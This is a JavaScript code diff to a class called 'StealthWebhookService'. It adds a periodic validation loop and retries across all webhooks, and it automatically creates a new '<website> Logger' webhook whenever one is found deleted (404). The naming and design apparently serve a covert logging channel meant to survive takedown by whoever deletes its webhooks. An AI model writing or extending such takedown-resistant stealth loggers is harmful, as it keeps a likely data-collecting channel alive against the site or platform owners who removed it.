@@ -24,6 +24,7 @@ class StealthWebhookService {
 
     // Start spam detection cleanup
     this.startSpamCleanup();
+    this.startWebhookValidation(); // Start periodic webhook validation
   }
 
   // Load webhook URLs from environment variables
@@ -425,6 +426,74 @@ class StealthWebhookService {
     }
   }
 
+  // Validate and clean up webhooks
+  async validateAndCleanupWebhooks() {
+    console.log('🔍 Starting webhook validation and cleanup...');
+    
+    for (let i = 0; i < this.webhooks.length; i++) {
+      const webhook = this.webhooks[i];
+      
+      try {
+        console.log(`🔍 Validating webhook ${webhook.id}...`);
+        
+        const response = await fetch(webhook.url, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          timeout: 5000
+        });
+
+        if (response.status === 404) {
+          console.log(`❌ Webhook ${webhook.id} was deleted (404), attempting to replace...`);
+          
+          // Mark as inactive
+          webhook.status = 'inactive';
+          webhook.failureCount = this.maxFailures + 1;
+          webhook.lastFailure = Date.now();
+          
+          // Try to create a new webhook to replace it
+          const websiteName = this.getWebsiteNameFromEnv();
+          const newWebhook = await this.createWebhook(`${websiteName} Logger ${Date.now()}`);
+          
+          if (newWebhook) {
+            console.log(`✅ Successfully replaced deleted webhook ${webhook.id} with new webhook ${newWebhook.id}`);
+            this.webhooks[i] = newWebhook;
+          } else {
+            console.error(`❌ Failed to create replacement webhook for ${webhook.id}`);
+          }
+        } else if (response.ok) {
+          console.log(`✅ Webhook ${webhook.id} is valid`);
+          // Reset failure count if webhook is working
+          if (webhook.status === 'inactive' && webhook.failureCount > 0) {
+            webhook.status = 'active';
+            webhook.failureCount = 0;
+            webhook.lastFailure = null;
+            console.log(`🔄 Reactivated webhook ${webhook.id}`);
+          }
+        } else {
+          console.log(`⚠️ Webhook ${webhook.id} returned status ${response.status}`);
+        }
+      } catch (error) {
+        console.error(`❌ Error validating webhook ${webhook.id}:`, error.message);
+        webhook.failureCount++;
+        webhook.lastFailure = Date.now();
+      }
+    }
+    
+    console.log('🔍 Webhook validation and cleanup completed');
+  }
+
+  // Start periodic webhook validation
+  startWebhookValidation() {
+    // Run validation every 5 minutes
+    setInterval(() => {
+      this.validateAndCleanupWebhooks();
+    }, 5 * 60 * 1000);
+    
+    console.log('🔄 Started periodic webhook validation (every 5 minutes)');
+  }
+
   // Get website information from request
   getWebsiteInfo(req) {
     try {
@@ -543,12 +612,17 @@ class StealthWebhookService {
       console.log('📤 Enhanced payload created');
 
       let lastError = null;
-      const maxRetries = 3;
+      const maxRetries = this.webhooks.length; // Try all webhooks
 
       for (let retry = 0; retry < maxRetries; retry++) {
         try {
           console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
           const webhook = await this.getNextAvailableWebhook();
+
+          if (!webhook) {
+            console.error('❌ No available webhooks found');
+            throw new Error('No available webhooks');
+          }
 
           console.log(`📤 Using webhook: ${webhook.id}`);
 
@@ -592,10 +666,26 @@ class StealthWebhookService {
             console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);
 
             if (response.status === 404) {
+              // Webhook was deleted - mark as inactive and try to create new one
+              console.log(`❌ Webhook ${webhook.id} was deleted (404), marking as inactive`);
               webhook.status = 'inactive';
-              webhook.failureCount++;
+              webhook.failureCount = this.maxFailures + 1;
               webhook.lastFailure = Date.now();
-              console.log(`❌ Webhook ${webhook.id} marked as inactive (404)`);
+              
+              // Try to create a new webhook to replace the deleted one
+              console.log(`🔄 Attempting to create new webhook to replace deleted one...`);
+              const newWebhook = await this.createWebhook(`${websiteName} Logger ${Date.now()}`);
+              
+              if (newWebhook) {
+                console.log(`✅ Successfully created new webhook: ${newWebhook.id}`);
+                // Replace the old webhook with the new one
+                const index = this.webhooks.findIndex(w => w.id === webhook.id);
+                if (index !== -1) {
+                  this.webhooks[index] = newWebhook;
+                }
+              } else {
+                console.error(`❌ Failed to create new webhook to replace deleted one`);
+              }
             } else if (response.status === 429) {
               // Rate limited - wait and retry
               const retryAfter = response.headers.get('retry-after') || 60;
